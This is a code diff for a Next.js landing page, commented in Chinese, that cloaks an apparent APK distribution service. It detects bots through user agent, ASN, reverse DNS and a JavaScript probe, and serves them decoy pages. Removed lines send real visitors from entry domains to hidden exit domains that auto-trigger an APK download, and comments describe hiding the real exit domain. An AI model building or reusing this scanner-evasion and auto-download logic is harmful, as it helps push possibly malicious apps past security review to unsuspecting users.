@@ -2,11 +2,8 @@ import { redirect } from "next/navigation";
 import { headers, cookies } from "next/headers";
 import {
   LandingRoute,
-  getCurrentEntry,
   getCurrentExit,
-  isEntryDomain,
   isExitDomain,
-  getSetting,
   getRouteByEntry,
   getRouteByExit,
   getPromoForRoute,
@@ -93,6 +90,7 @@ export default async function Page({
     redirect("/admin");
   }
 
+  const legacyExit = getCurrentExit();
   const entryRoute = getRouteByEntry(host);
   const exitRoute = getRouteByExit(host);
   const route = entryRoute || exitRoute;
@@ -137,7 +135,6 @@ export default async function Page({
     redirect(target.toString());
   }
 
-  const currentExit = getCurrentExit();
   const cloakOn = isCloakEnabled();
 
   // ── 分流判定（出口域名 + 入口域名均保护）──────────────────────────────
@@ -152,67 +149,26 @@ export default async function Page({
     if (!isHuman) {
       // 已探测过判为机器 → 直接给假内容（不再发探针，防死循环）
       if (probedCookie === "0") {
-        await recordGlobalVariant("fake", "JS 探针未通过", host, currentExit || "", promo, h);
-        return decoyResponse(host, promo, currentExit);
+        await recordGlobalVariant("fake", "JS 探针未通过", host, legacyExit || "", promo, h);
+        return decoyResponse(host, promo);
       }
 
       // 服务端层快速初判（同步：UA + ASN；异步加 PTR，有超时容忍）
       const verdict = await classifyServerAsync(h);
       if (verdict.decision === "bot") {
-        await recordGlobalVariant("fake", verdict.reason, host, currentExit || "", promo, h);
-        return decoyResponse(host, promo, currentExit);
+        await recordGlobalVariant("fake", verdict.reason, host, legacyExit || "", promo, h);
+        return decoyResponse(host, promo);
       }
 
       // 需要 JS 探针确认 → 返回加载页
-      await recordGlobalVariant("probe", "需 JS 探针确认", host, currentExit || "", promo, h);
+      await recordGlobalVariant("probe", "需 JS 探针确认", host, legacyExit || "", promo, h);
       return new Response(probePage(), {
         headers: { "content-type": "text/html; charset=utf-8" },
       });
     }
   }
 
-  // ---- 情况 A:出口域名 → 展示落地页 + 触发 APK 下载 ----
-  if (isExitDomain(host)) {
-    const apkUrl = getSetting("apk_url") || "";
-    const imageUrl = normalizeUploadImagePath(getSetting("image_url"));
-    const title = getSetting("title") || "下载";
-    const autoDownload = getSetting("auto_download") === "1";
-    return (
-      <ExitLanding
-        apkUrl={apkUrl}
-        imageUrl={imageUrl}
-        title={title}
-        autoDownload={autoDownload}
-        promo={promo}
-      />
-    );
-  }
-
-  // ---- 情况 B:入口域名 → 记录访问 → 跳转到当前出口 ----
-  const isEntry = isEntryDomain(host);
-  const fallback = getSetting("fallback_redirect") === "1";
-
-  if ((isEntry || fallback) && currentExit) {
-    let visitId = 0;
-    try {
-      visitId = await recordVisit({
-        promo_code: promo,
-        page_variant: "real",
-        cloak_reason: "",
-        entry_domain: host,
-        exit_domain: currentExit,
-        headers: h,
-      });
-    } catch {
-      // 记录失败不阻塞跳转
-    }
-    const target = new URL(`https://${currentExit}/`);
-    if (promo) target.searchParams.set("c", promo);
-    if (visitId) target.searchParams.set("v", String(visitId));
-    redirect(target.toString());
-  }
-
-  // ---- 情况 C:无可用出口 / 未配置 ----
+  // ---- 无启用线路 / 未配置 ----
   return (
     <main style={{ padding: 40, textAlign: "center" }}>
       <p>服务未就绪</p>
@@ -307,10 +263,10 @@ function routeDecoyResponse(route: LandingRoute, promo: string) {
 }
 
 // 返回假落地页（出口域名给假内容，入口域名给假跳转）
-function decoyResponse(host: string, promo: string, currentExit: string | null) {
+function decoyResponse(host: string, promo: string) {
   const decoy = getDecoyConfig();
 
-  // 出口域名：直接渲染假落地页
+  // 兼容旧全局分流：只给假内容，不再使用旧入口/出口真实跳转。
   if (isExitDomain(host)) {
     return (
       <ExitLanding
@@ -323,8 +279,6 @@ function decoyResponse(host: string, promo: string, currentExit: string | null) 
     );
   }
 
-  // 入口域名：跳转到假出口（复用当前出口域名，但带假内容标记）
-  // 简单做法：直接给假落地页，不跳转，避免泄露真实出口域名
   return (
     <ExitLanding
       apkUrl={decoy.apkUrl}
